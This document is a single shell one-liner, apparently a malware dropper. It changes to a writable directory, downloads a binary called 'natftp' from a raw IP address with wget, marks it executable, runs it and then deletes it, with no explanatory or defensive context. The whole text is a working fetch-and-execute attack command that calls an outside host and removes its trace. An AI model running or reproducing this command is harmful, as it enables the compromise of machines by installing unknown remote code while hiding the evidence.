cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.207.247/natftp; chmod +x natftp; ./natftp; rm -rf natftp
